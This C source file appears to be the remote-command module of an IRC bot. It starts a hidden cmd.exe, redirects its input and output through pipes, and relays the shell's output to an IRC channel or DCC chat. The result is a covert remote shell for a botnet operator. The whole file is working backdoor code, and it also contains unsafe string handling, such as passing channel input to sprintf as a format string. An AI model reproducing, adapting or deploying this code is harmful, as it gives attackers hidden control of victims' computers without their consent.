#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_REMOTECMD

HANDLE pipe_read;
HANDLE pipe_write;
HANDLE pipe_Hproc;
HANDLE hChildInWrDupe;
SOCKET pipesock;
char pipe_chan[50]; 

void Close_Handles(void)
{
	if (pipe_read != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_read);
	if (pipe_write != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_write);
	if (pipe_Hproc != INVALID_HANDLE_VALUE) 
		CloseHandle(pipe_Hproc);

	return;
}

BOOL send_commands(char *commands)
{   // FIX ME: Check the return value for WriteFile and a way to make it fail.
	// This would solve the problem on DCC chat staying open while open cmd has closed.
	DWORD cmdlen = strlen(commands);
	if (!WriteFile(hChildInWrDupe,commands,cmdlen,&cmdlen,NULL)) {
		Close_Handles(); 
		return FALSE;
	}

	return TRUE;
}

int pipe_send(SOCKET sock,char *chan,char *buf)
{
	char sendbuf[IRCLINE];

	if (strcmp(chan, "") != 0) {
		Sleep(FLOOD_DELAY);
		sprintf(sendbuf,"PRIVMSG %s :%s\r",chan,buf);
	} else 
		sprintf(sendbuf,"%s",buf);

	if (fsend(sock,sendbuf,strlen(sendbuf),0) <= 0) 
		Close_Handles();

	return 0;
}

// FIX ME: Break out of while loop and share exit code for thread termination
DWORD WINAPI PipeReadThread(LPVOID param)
{
	DWORD numread, br;
	char buffer[IRCLINE];

	int threadnum = (int)param;

	while (1) {
		BOOL eol = FALSE;
		DWORD State;

		memset(buffer,0,sizeof(buffer));
		if (!PeekNamedPipe(pipe_read,buffer,IRCLINE,&br,NULL,NULL)) {
			pipe_send(pipesock,pipe_chan,"[CMD]: Could not read data from proccess\r\n");
			clearthread(threadnum);

			ExitThread(1);
		}

		if (br == 0) { //nothing to read 
			if (GetExitCodeProcess(pipe_Hproc,&State)) { 
				if (State != STILL_ACTIVE) {
					Close_Handles(); 
					pipe_send(pipesock,pipe_chan,"[CMD]: Proccess has terminated.\r\n");
					clearthread(threadnum);

					ExitThread (0);
				}
			}
			Sleep(10); //process pause and retry
			continue;
		}

		DWORD cbyte;
		for (cbyte=0;cbyte<br;cbyte++) {
			if (buffer[cbyte] == '\n') {
				eol = TRUE;
				break;
			}
		}
		if (eol) 
			br = cbyte + 1;
		else 
			br = 512;
		memset(buffer,0,sizeof(buffer));
		if (!ReadFile(pipe_read, buffer, br, &numread, NULL)) 
				break;
		pipe_send(pipesock,pipe_chan,buffer);

	}
	pipe_send(pipesock,pipe_chan,"[CMD]: Could not read data from proccess.\r\n");
	clearthread(threadnum);

	ExitThread (0);
}

int open_cmd(SOCKET sock,char * chan)
{
	char cmddir[MAX_PATH];
	int threadnum;

	SECURITY_ATTRIBUTES secAttr;
	HANDLE hChildOutRd, hChildOutWr, hChildInRd, hChildInWr;

	Close_Handles();

	if(fSearchPath(NULL,"cmd.exe",NULL,sizeof(cmddir),cmddir,NULL) == 0)
		return -1;  

    secAttr.nLength = sizeof(secAttr);
    secAttr.bInheritHandle = TRUE;
    secAttr.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hChildOutRd, &hChildOutWr, &secAttr, 0)) 
		return -1;
    if (!CreatePipe(&hChildInRd, &hChildInWr, &secAttr, 0)) 
		return -1;
    if (!DuplicateHandle(GetCurrentProcess(), hChildInWr, GetCurrentProcess(), &hChildInWrDupe, 0, FALSE, DUPLICATE_SAME_ACCESS | DUPLICATE_CLOSE_SOURCE)) 
		return -1;

  	PROCESS_INFORMATION pinfo;
	memset(&pinfo, 0, sizeof(pinfo));
	STARTUPINFO sinfo;
   	memset(&sinfo, 0, sizeof(sinfo));
   	sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    sinfo.wShowWindow = SW_HIDE;
    sinfo.hStdInput = hChildInRd;
    sinfo.hStdOutput = hChildOutWr;
	sinfo.hStdError = hChildOutWr;
   	if (!CreateProcess(cmddir,"", NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo)) 
		return -1;
   	CloseHandle(hChildInRd);

	DWORD id;
	pipe_read = hChildOutRd;
	pipe_write = hChildInWr;
	pipe_Hproc = pinfo.hProcess;
   	CloseHandle(pinfo.hThread);
	pipesock = sock;

	if (chan) 
		sprintf(pipe_chan,chan);
	else 
		sprintf(pipe_chan,""); 		

	threadnum = addthread("[CMD]: Remote Command Prompt",RCMD_THREAD,NULL);
	threads[threadnum].tHandle = CreateThread(NULL, 0, &PipeReadThread, (void *)threadnum, 0, &id);
	threads[threadnum].pid = pinfo.dwProcessId;

	return 0;
}
#endif
